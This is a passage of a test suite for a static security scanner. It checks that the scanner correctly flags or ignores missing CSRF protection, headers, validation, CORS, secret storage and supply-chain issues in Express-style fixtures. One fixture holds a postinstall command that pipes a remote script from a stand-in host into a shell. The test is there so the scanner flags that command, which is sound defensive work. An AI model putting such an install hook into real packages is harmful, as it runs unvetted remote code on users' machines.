      `app.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n${checkout}`,
      NEXT_DEP,
    );
    expect(certaintyOf(repo, "csrf_missing")).toBe(0.8);
  });

  it.each([
    ["Origin header comparison", `app.use((req, res, next) => {\n  if (req.method !== "GET" && req.get("origin") !== ORIGIN) return res.sendStatus(403);\n  next();\n});`],
    ["Sec-Fetch-Site", `app.use((req, res, next) => {\n  if (req.headers["sec-fetch-site"] === "cross-site") return res.sendStatus(403);\n  next();\n});`],
    ["Referer allowlist", `app.use((req, res, next) => {\n  const referer = req.headers.referer || "";\n  if (!referer.startsWith(SITE)) return res.sendStatus(403);\n  next();\n});`],
  ])("4b: %s is CSRF protection", (_name, guard) => {
    const repo = expressRepo(`${guard}\n${checkout}`, { "cookie-session": "^2.0.0" });
    expect(kindsOf(repo)).not.toContain("csrf_missing");
  });

  it("4b: reading the origin for CORS reflection without comparing it is not protection", () => {
    const repo = expressRepo(
      `app.use((req, res, next) => { res.set("Vary", req.headers.origin); next(); });\n${checkout}`,
      NEXT_DEP,
    );
    expect(kindsOf(repo)).toContain("csrf_missing");
  });

  it("4c: csrf-sync's doubleSubmit counts as a used CSRF package", () => {
    const repo = expressRepo(
      `const { doubleSubmit } = require("csrf-sync");\napp.use(doubleSubmit);\n${checkout}`,
      { ...NEXT_DEP, "csrf-sync": "^4.0.0" },
    );
    expect(kindsOf(repo)).not.toContain("csrf_missing");
  });
});

describe("adversarial: security_headers_missing", () => {
  const web = expressRepo(`app.get("/x", ${HANDLER});`);

  it.each([
    ["nginx add_header", "nginx.conf", `server {\n  add_header Content-Security-Policy "default-src 'self'";\n}\n`],
    ["Caddyfile header", "Caddyfile", `example.com {\n  header Strict-Transport-Security "max-age=31536000"\n}\n`],
    ["firebase.json hosting headers", "firebase.json", `{ "hosting": { "headers": [ { "source": "**", "headers": [ { "key": "X-Frame-Options", "value": "DENY" } ] } ] } }`],
  ])("5a: %s sets the headers", (_name, path, content) => {
    expect(kindsOf([...web, file(path, content)])).not.toContain("security_headers_missing");
  });

  it("5a: a commented-out nginx header does not count", () => {
    const repo = [...web, file("nginx.conf", `server {\n  # add_header Content-Security-Policy "default-src 'self'";\n}\n`)];
    expect(kindsOf(repo)).toContain("security_headers_missing");
  });

  it("5b: hono's secureHeaders() middleware is header middleware", () => {
    const repo = [
      manifest({ hono: "^4.0.0" }),
      LOCKFILE,
      file(
        "src/index.ts",
        `import { Hono } from "hono";\nimport { secureHeaders } from "hono/secure-headers";\nconst app = new Hono();\napp.use(secureHeaders());\nexport default app;\n`,
      ),
    ];
    expect(kindsOf(repo)).not.toContain("security_headers_missing");
  });

  it("5c: a CSP meta tag in a server template counts", () => {
    const repo = [
      ...expressRepo(`app.set("view engine", "ejs");\napp.get("/", (req, res) => res.render("index"));`),
      file("views/index.ejs", `<html><head><meta http-equiv="Content-Security-Policy" content="default-src 'self'"></head></html>`),
    ];
    expect(kindsOf(repo)).not.toContain("security_headers_missing");
  });

  it("still reports a web app with none of these", () => {
    expect(kindsOf(web)).toContain("security_headers_missing");
  });
});

describe("adversarial: input_validation_missing", () => {
  it("6a: a schema imported from a workspace package and parsed in the handler is validation", () => {
    const repo = [
      manifest({ express: "^4.0.0" }),
      LOCKFILE,
      expressApp(
        `const { UserSchema } = require("@acme/schemas");\napp.post("/x", (req, res) => { const u = UserSchema.parse(req.body); res.json(u); });`,
      ),
    ];
    expect(kindsOf(repo)).not.toContain("input_validation_missing");
  });

  it("6a: a validate() call on a locally imported schema counts", () => {
    const repo = expressRepo(
      `const { orderSchema } = require("../lib/orders");\napp.post("/x", async (req, res) => { const v = await orderSchema.validate(req.body); res.json(v); });`,
    );
    expect(kindsOf(repo)).not.toContain("input_validation_missing");
  });

  it("6b: validation middleware mounted with router.use covers the routes under it", () => {
    const repo = expressRepo(
      `const validate = require("./validate");\napp.use(validate);\napp.post("/x", (req, res) => res.json(req.body));`,
    );
    expect(kindsOf(repo)).not.toContain("input_validation_missing");
  });

  it("6c: an express-validator chain from a shared module is validating middleware", () => {
    const repo = [
      manifest({ express: "^4.0.0", "express-validator": "^7.0.0" }),
      LOCKFILE,
      expressApp(
        `const { rules } = require("./validators");\napp.post("/x", rules.email, (req, res) => res.json(req.body));`,
      ),
      file(
        "src/validators.js",
        `const { body } = require("express-validator");\nexports.rules = { email: body("email").isEmail() };\n`,
      ),
    ];
    expect(kindsOf(repo)).not.toContain("input_validation_missing");
  });

  it("6d: celebrate is a validation library", () => {
    const repo = [
      manifest({ express: "^4.0.0", celebrate: "^15.0.0" }),
      LOCKFILE,
      expressApp(
        `const { celebrate, Joi } = require("celebrate");\napp.post("/x", celebrate({ body: Joi.object() }), (req, res) => res.json(req.body));`,
      ),
    ];
    expect(kindsOf(repo)).not.toContain("input_validation_missing");
  });

  it("still reports a handler that reads the body and validates nothing", () => {
    expect(kindsOf(CASES[5].absent)).toContain("input_validation_missing");
  });
});

describe("adversarial: transport_insecure", () => {
  it.each([
    ["a Kubernetes service address", `fetch("http://payments.default.svc/pay");`],
    ["a cluster-local address", `fetch("http://api.default.svc.cluster.local/x");`],
    ["an Open Graph namespace", `const prefix = "og: http://ogp.me/ns#";`],
    ["an Adobe XMP namespace", `const NS = "http://ns.adobe.com/xap/1.0/";`],
  ])("7a/7b: %s is not an external endpoint", (_name, code) => {
    expect(kindsOf([file("src/c.js", code)])).not.toContain("transport_insecure");
  });

  it("7a: a compose service name with a dot is an internal host", () => {
    const repo = [
      file("docker-compose.yml", `services:\n  minio.storage:\n    image: minio/minio\n  api:\n    build: .\n`),
      file("src/c.js", `fetch("http://minio.storage:9000/bucket");`),
    ];
    expect(kindsOf(repo)).not.toContain("transport_insecure");
  });

  it("7d: a database port published only in a development compose file is not exposure", () => {
    const repo = [file("docker-compose.dev.yml", `services:\n  db:\n    image: postgres:16\n    ports:\n      - "5432:5432"\n`)];
    expect(kindsOf(repo)).not.toContain("transport_insecure");
  });

  it("7e: tooling directories are not application source", () => {
    expect(kindsOf([file("tools/proxy.js", `fetch("http://api.acme-corp.com/v1");`)])).not.toContain("transport_insecure");
    expect(isScannable("bin/dev-proxy.js")).toBe(false);
  });

  it("still reports a plaintext request to a real host and a production compose port", () => {
    expect(kindsOf(CASES[6].absent)).toContain("transport_insecure");
    const compose = [file("docker-compose.yml", `services:\n  db:\n    ports:\n      - "5432:5432"\n`)];
    expect(kindsOf(compose)).toContain("transport_insecure");
  });
});

describe("adversarial: password_storage_weak", () => {
  const login = `app.post("/login", async (req, res) => { const { password } = req.body; await users.check(password); res.end(); });`;

  it.each([
    ["passport-local-mongoose hashes with pbkdf2", { "passport-local-mongoose": "^8.0.0" }],
    ["sodium-native's crypto_pwhash is a KDF", { "sodium-native": "^4.0.0" }],
    ["keycloak-connect delegates the password", { "keycloak-connect": "^26.0.0" }],
    ["@ory/client delegates the password", { "@ory/client": "^1.0.0" }],
  ])("8a: %s", (_name, deps) => {
    const repo = expressRepo(login, { pg: "^8.0.0", ...deps });
    expect(kindsOf(repo)).not.toContain("password_storage_weak");
  });

  it("8b: a passwordless login has no password to hash", () => {
    const repo = expressRepo(
      `app.post("/login", async (req, res) => { await sendMagicLink(req.body.email); res.end(); });`,
      { pg: "^8.0.0", otplib: "^12.0.0" },
    );
    expect(kindsOf(repo)).not.toContain("password_storage_weak");
  });

  it("still reports a password login against a datastore with no KDF", () => {
    expect(kindsOf(expressRepo(login, { pg: "^8.0.0" }))).toContain("password_storage_weak");
  });
});

describe("adversarial: logging_missing", () => {
  it.each([
    ["a NestJS-style this.logger.log()", `app.post("/login", (req, res) => { this.logger.log("login"); res.end(); });`],
    ["an audit helper called in the handler", `const { audit } = require("./audit");\napp.post("/login", (req, res) => { audit(req, "login"); res.end(); });`],
    ["a re-exported log() function", `const { log } = require("@/lib/logger");\napp.post("/login", (req, res) => { log("login attempt"); res.end(); });`],
  ])("9a: %s is logging", (_name, body) => {
    expect(kindsOf(expressRepo(body))).not.toContain("logging_missing");
  });

  it.each([
    ["requestLogger", `const requestLogger = require("./logging");\napp.use(requestLogger);`],
    ["morgan", `const morgan = require("morgan");\napp.use(morgan("combined"));`],
    ["pinoHttp", `const pinoHttp = require("pino-http");\napp.use(pinoHttp());`],
  ])("9b: %s applied with .use() is logging", (_name, setup) => {
    const repo = expressRepo(`${setup}\napp.post("/login", ${HANDLER});`);
    expect(kindsOf(repo)).not.toContain("logging_missing");
  });

  it("9c: pino-http and cloud logging SDKs are logging dependencies", () => {
    expect(kindsOf(expressRepo(`app.post("/login", ${HANDLER});`, { "pino-http": "^10.0.0" }))).not.toContain("logging_missing");
    expect(kindsOf(expressRepo(`app.post("/login", ${HANDLER});`, { "@google-cloud/logging": "^11.0.0" }))).not.toContain("logging_missing");
  });

  it("still reports a login route with no logging anywhere", () => {
    expect(kindsOf(CASES[8].absent)).toContain("logging_missing");
  });
});

describe("adversarial: error_handling_gap", () => {
  const unguarded = `app.get("/a", async (req, res) => { await load(); res.end(); });`;

  it.each([
    ["an error handler registered with options", `app.use(errorHandler({ log: true }));`],
    ["Sentry's error handler", `app.use(Sentry.Handlers.errorHandler());`],
  ])("10a: %s is a registered error handler", (_name, registration) => {
    expect(kindsOf(expressRepo(`${unguarded}\n${registration}`))).not.toContain("error_handling_gap");
  });

  it("10b: express-async-handler forwards rejections", () => {
    expect(kindsOf(expressRepo(unguarded, { "express-async-handler": "^1.2.0" }))).not.toContain("error_handling_gap");
  });

  it("10b: a local catchAsync wrapper forwards the handler's rejection", () => {
    const repo = expressRepo(
      `const { catchAsync } = require("./utils");\napp.get("/a", catchAsync(async (req, res) => { await load(); res.end(); }));`,
    );
    expect(kindsOf(repo)).not.toContain("error_handling_gap");
  });

  it("10c: .catch(next) on the awaited promise handles the rejection", () => {
    const repo = expressRepo(
      `app.get("/a", async (req, res, next) => { const x = await load().catch(next); res.json(x); });`,
    );
    expect(kindsOf(repo)).not.toContain("error_handling_gap");
  });

  it("still reports an unguarded await with no handler registered", () => {
    expect(kindsOf(CASES[9].absent)).toContain("error_handling_gap");
  });
});

describe("adversarial: cors_permissive", () => {
  const CORS = { cors: "^2.8.5" };

  it("11a: a bare cors() with no credentials exposes public data only, at 0.5", () => {
    const repo = expressRepo(`app.use("/public", cors());\napp.get("/public/feed", ${HANDLER});`, CORS);
    const gap = gapsOf(repo).find((g) => g.kind === "cors_permissive");
    expect(gap?.certainty).toBe(0.5);
    expect(gap?.basisFacts).toContain("no credentials");
  });

  it("11a: a reflected origin, or a wildcard beside credentials: true, stays at 0.9", () => {
    const reflected = expressRepo(`const cors = require("cors");\napp.use(cors({ origin: true }));`, CORS);
    expect(certaintyOf(reflected, "cors_permissive")).toBe(0.9);
    const withCredentials = expressRepo(
      `const cors = require("cors");\napp.use(cors());\napp.use((req, res, next) => { res.set("Access-Control-Allow-Credentials", "true"); next(); });`,
      CORS,
    );
    expect(certaintyOf(withCredentials, "cors_permissive")).toBe(0.9);
  });

  it("11b: a locally defined cors() with restrictive defaults is not the package", () => {
    const repo = [
      manifest({ express: "^4.0.0" }),
      LOCKFILE,
      expressApp(
        `function cors(options = { origin: "https://app.example.com" }) { return (req, res, next) => next(); }\napp.use(cors());`,
      ),
    ];
    expect(kindsOf(repo)).not.toContain("cors_permissive");
  });

  it("still reports the package's bare call and a wildcard header", () => {
    expect(kindsOf(CASES[10].absent)).toContain("cors_permissive");
    expect(kindsOf(expressRepo(`app.use((req, res, next) => { res.setHeader("Access-Control-Allow-Origin", "*"); next(); });`))).toContain("cors_permissive");
  });
});

describe("adversarial: supply_chain_integrity", () => {
  it("12a: a manifest with no dependencies needs no lockfile", () => {
    expect(kindsOf([manifest({})])).not.toContain("supply_chain_integrity");
  });

  it("12c: the repository's own tooling in postinstall is 0.4, and ignore-scripts silences it", () => {
    const tooling = [manifest({ prisma: "^5.0.0" }, { postinstall: "prisma generate" }), LOCKFILE];
    expect(certaintyOf(tooling, "supply_chain_integrity")).toBe(0.4);
    const ignored = [...tooling, file(".npmrc", "ignore-scripts=true\n")];
    expect(kindsOf(ignored)).not.toContain("supply_chain_integrity");
    const arbitrary = [manifest({}, { postinstall: "curl https://x.example | sh" }), LOCKFILE];
    expect(certaintyOf(arbitrary, "supply_chain_integrity")).toBe(0.9);
  });

  it("12d: a vendor script that forbids SRI is not reported", () => {
    const page = file("index.html", `<script src="https://js.stripe.com/v3/"></script>\n<script src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>`);
    expect(kindsOf([page])).not.toContain("supply_chain_integrity");
  });

  it("12e: a build-time SRI plugin covers template script tags", () => {
    const repo = [
      manifest({}, {}, { "vite-plugin-sri": "^0.1.0" }),
      LOCKFILE,
      file("src/index.html", `<script src="https://cdn.jsdelivr.net/npm/x@1/x.js"></script>`),
    ];
    expect(kindsOf(repo)).not.toContain("supply_chain_integrity");
  });

  it("still reports a library CDN script with no integrity", () => {
    expect(kindsOf([file("index.html", `<script src="https://cdn.jsdelivr.net/npm/x@1/x.js"></script>`)])).toContain("supply_chain_integrity");
  });
});

describe("adversarial: client_secret_storage", () => {
  it.each([
    ["a token expiry timestamp", `localStorage.setItem("tokenExpiresAt", String(Date.now() + 3600e3));`],
    ["a CSRF double-submit token", `sessionStorage.setItem("csrfToken", token);`],
    ["a publishable key", `localStorage.setItem("stripePublishableKey", pk);`],
    ["a CAPTCHA token", `sessionStorage.setItem("recaptchaToken", t);`],
  ])("13a: %s is not a secret", (_name, code) => {
    expect(kindsOf([file("src/auth.js", code)])).not.toContain("client_secret_storage");
  });

  it("13d: clearing a key on logout is not storing a secret", () => {
    expect(kindsOf([file("src/logout.js", `localStorage.setItem("token", "");\nlocalStorage.setItem("apiKey", null);`)])).not.toContain("client_secret_storage");
  });

  it("still reports a real token write", () => {
    expect(kindsOf([file("src/auth.js", `localStorage.setItem("token", data.accessToken);`)])).toContain("client_secret_storage");
  });
});
